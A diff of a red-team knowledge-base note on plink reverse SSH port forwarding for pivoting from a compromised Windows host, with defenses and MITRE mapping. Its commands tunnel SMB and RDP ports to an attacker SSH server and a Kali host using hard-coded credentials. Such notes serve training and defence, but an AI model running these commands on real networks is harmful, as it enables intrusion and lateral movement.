@@ -41,11 +41,15 @@ Plink is a command-line tool for Windows that allows users to connect to a remot
 
 The business value of this technique is that it allows attackers to gain access to internal resources and move laterally within a network. This can be used to steal sensitive data, disrupt operations, or launch further attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised host
 
 1. plink command-line tool
+
+ 
 
 ## Defense
 
@@ -55,19 +59,31 @@ The business value of this technique is that it allows attackers to gain access 
 
 1. Use network segmentation to limit the impact of a compromised host
 
+ 
+
 ## Objectives
 
 1. Gain access to internal resources
 
 1. Move laterally within the network
 
+ 
+
 # Instructions
 
 1. The above commands are used to forward ports from a local machine to a remote machine through SSH. The -R option is used to specify the remote port to forward to and the local IP and port to forward from. The -L option can be used to specify the local port to forward to and the remote IP and port to forward from. The -P option specifies the SSH server port to connect to. The -l option specifies the username to use for the SSH connection. The -pw option specifies the password to use for the SSH connection.
 
+ 
+
+
+
 **Code**: [[# exposes the SMB port of the machine in the port ]]
 
+
+
 > In the first command, the SMB port of the local machine is forwarded to the SSH server on port 445. In the second command, the RDP port of the local machine is forwarded to the SSH server on port 3390. The third and fourth commands are examples of using the -R and -L options to forward ports. The fifth command is an example of forwarding a port on a VPS. The last command redirects the Windows port 445 to Kali on port 22.
+
+
 
 **Command** ([[Expose SMB port on SSH server]]):
 
@@ -75,11 +91,19 @@ The business value of this technique is that it allows attackers to gain access 
 plink -l root -pw toor -R 445:127.0.0.1:445
 ```
 
+
+
+
+
 **Command** ([[Expose RDP port on SSH server]]):
 
 ```bash
 plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389
 ```
+
+
+
+
 
 **Command** ([[Forward port to VPS]]):
 
@@ -87,11 +111,17 @@ plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389
 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 ```
 
+
+
+
+
 **Command** ([[Redirect Windows port to Kali]]):
 
 ```bash
 plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -119,3 +149,5 @@ plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
 
 - [[Network Pivoting Techniques]]
 - [[plink]]
+
+
